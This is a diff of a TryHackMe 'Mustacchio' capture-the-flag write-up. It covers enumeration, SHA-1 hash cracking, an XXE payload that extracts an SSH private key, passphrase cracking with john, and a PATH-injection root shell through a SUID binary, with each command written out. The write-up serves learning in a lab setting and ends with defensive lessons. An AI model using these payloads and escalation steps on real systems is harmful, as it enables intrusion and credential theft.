@@ -3,33 +3,47 @@
 ## 📌 Overview
 **Room Name:** Mustacchio  
 **Platform:** TryHackMe  
-**Difficulty:** Easy
+**Difficulty:** Easy  
+**Category:** Web Exploitation / XXE / Privilege Escalation
 
-Mustacchio is a highly educational machine that covers several core penetration testing concepts, including enumeration, database analysis, XXE (XML External Entity) attacks, SSH key cracking, and final-stage privilege escalation using PATH Injection.
+Mustacchio covers several core penetration testing concepts including enumeration, database analysis, XXE (XML External Entity) attacks, SSH key cracking, and privilege escalation via PATH Injection.
+
+The attack chain involves:
+
+- Web directory discovery revealing a SQLite database backup
+- hashcat to crack admin credentials from the database
+- XXE attack to extract Barry's SSH private key
+- ssh2john and john to crack the key passphrase
+- PATH Injection via a SUID binary calling `tail` with a relative path
 
 ---
 
 ## 🔍 1. Enumeration
-### Port Scanning
-I began with an `nmap` scan against the target and identified the following open ports:
+
+### 🔎 Port Scanning
+
+```bash
+nmap -sC -sV <target_ip>
+```
 
 ```text
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
 80/tcp   open  http    Apache httpd 2.4.18
 8765/tcp open  http    nginx 1.10.3
 ```
 
-- **80/tcp:** Running a standard website.
-- **8765/tcp:** Running another web service (Admin portal).
+- **80/tcp** — Standard website
+- **8765/tcp** — Admin portal
 
-### Directory Brute-forcing
-Using `gobuster` to explore hidden directories, I discovered a `/custom/` directory. Inside its `js/` folder, I found a SQLite database backup file named **`users.bak`**.
+### 🌐 Directory Brute-forcing
+Using `gobuster`, discovered a `/custom/` directory. Inside its `js/` folder was a SQLite database backup file: **`users.bak`**.
 
 ---
 
-## 📂 2. Database Analysis & Cracking
-I downloaded `users.bak` and checked it with the `file` command, confirming it was a SQLite 3.x database.
+## 🔓 2. Initial Access
+
+### 🗄️ Database Analysis & Hash Cracking
+Downloaded `users.bak` and queried it with `sqlite3`:
 
 ```bash
 sqlite3 users.bak
@@ -37,23 +51,18 @@ sqlite> .tables
 sqlite> SELECT * FROM users;
 ```
 
-This revealed what appeared to be administrator credentials:
+Retrieved admin credentials:
 
 - **Username:** `admin`
-- **Hash:** `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`
+- **Hash:** `1868e36a6d2b17d4c2745f1659433a54d4bc5f4b` (SHA-1)
 
-Using `hash-identifier`, I determined the hash was SHA-1. I then used `hashcat` to crack it:
+Cracked with `hashcat`:
 
-- **Cracked Password:** `bulldog19`
+- **Password:** `bulldog19`
 
----
+### 🌐 XXE Attack — SSH Key Extraction
+Logged into the admin panel on port `8765`. The `Add a comment` form processed XML input. Confirmed XXE vulnerability and crafted a payload to extract Barry's SSH private key:
 
-## 🌐 3. Web Exploitation (XXE)
-With the cracked password, I logged into the admin panel running on port `8765`. Inside the panel, there was an `Add a comment` input form. By inspecting the source code, I found comments indicating that this form processed XML.
-
-Realizing it was vulnerable to XXE, I crafted a payload to extract Barry's SSH private key.
-
-**XXE Payload:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -66,47 +75,61 @@ Realizing it was vulnerable to XXE, I crafted a payload to extract Barry's SSH p
 </root>
 ```
 
-This payload successfully returned Barry's encrypted private SSH key (`id_rsa`).
+Barry's encrypted private SSH key was returned in the response.
 
----
+### 🔑 SSH Key Cracking
+Converted the key and cracked the passphrase:
 
-## 🔓 4. Initial Access
-The extracted SSH key was protected by a passphrase. To crack it, I converted the key into a crackable format using `ssh2john` and then ran John the Ripper with the `rockyou.txt` wordlist.
+```bash
+ssh2john id_rsa > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
-After successfully cracking the passphrase, I used the key to log in via SSH as `barry`. From there, I stabilized my interactive shell using Python and began internal enumeration.
+Logged in as `barry`:
 
-At this point, I was able to read the user flag:
+```bash
+ssh -i id_rsa barry@<target_ip>
+```
+
+**Initial access as `barry` achieved.** ✅
 
 ```bash
 cat user.txt
 # [REDACTED]
 ```
+
 ---
 
-## 🚀 5. Privilege Escalation: barry → root
-While enumerating the system, I found a very interesting binary at `/home/joe/live_log`.
+## 👑 3. Privilege Escalation: barry → root
 
-- **Permissions:** The SUID bit was set, meaning it executes with `root` privileges.
-- **Analysis:** Running the `strings` command on the binary revealed that it executes `tail -f /var/log/nginx/access.log` internally.
+### 🔍 SUID Binary — PATH Injection
+Found an interesting SUID binary at `/home/joe/live_log`. Analyzed with `strings`:
 
-Because the binary called `tail` without specifying its absolute path (like `/usr/bin/tail`), it was vulnerable to **PATH Injection**.
-
-**Exploitation Commands:**
 ```bash
-# 1. Create a fake 'tail' command (which is actually bash)
+strings /home/joe/live_log
+```
+
+The binary internally executes `tail -f /var/log/nginx/access.log` using a **relative path** — making it vulnerable to PATH Injection.
+
+### 🔓 Exploitation
+
+```bash
+# 1. Create a fake 'tail' that spawns bash
 echo "/bin/bash" > /tmp/tail
 
 # 2. Make it executable
 chmod +x /tmp/tail
 
-# 3. Prepend /tmp to the PATH environment variable
+# 3. Prepend /tmp to PATH
 export PATH=/tmp:$PATH
 
-# 4. Execute the SUID binary
+# 4. Run the SUID binary
 /home/joe/live_log
 ```
 
-When the binary ran, it executed my fake `/tmp/tail` with root privileges instead of the real `tail` command. This instantly granted me a root shell. Finally, I read the `/root/root.txt` flag to complete the room.
+The binary executed `/tmp/tail` with root privileges instead of the real `tail`.
+
+**ROOT ACCESS GRANTED.** ✅
 
 ```bash
 cat /root/root.txt
@@ -116,6 +139,26 @@ cat /root/root.txt
 ---
 
 ## 📚 Key Takeaways
-- **Leftover Backup Files:** Leaving `.bak` files in web-accessible directories (like `/custom/`) can provide attackers with a critical initial foothold.
-- **XML Parsing Dangers:** Allowing external entities in XML parsers directly leads to sensitive internal file disclosure via XXE attacks.
-- **Relative Paths in SUID Binaries:** When calling system commands from within a SUID binary, always use the absolute path (e.g., `/usr/bin/tail`). Failing to do so makes the system highly vulnerable to PATH Injection.
+
+- 📂 **Leftover backup files are dangerous:** Leaving `.bak` files in web-accessible directories can hand an attacker a critical foothold.
+- 🧩 **XXE enables file disclosure:** Allowing external entities in XML parsers directly leads to sensitive internal file reads — including SSH private keys.
+- 🛠️ **SUID binaries must use absolute paths:** Calling system commands with relative paths inside SUID binaries makes them vulnerable to PATH Injection.
+
+---
+
+## 🛠️ Tools Used
+
+- `nmap`
+- `gobuster`
+- `sqlite3`
+- `hashcat`
+- `ssh2john`, `john`
+- `ssh`
+- `strings`
+
+---
+
+## 📚 Credit
+✍️ Author: Akira Hasuo
+
+📘 Created for educational and portfolio purposes only
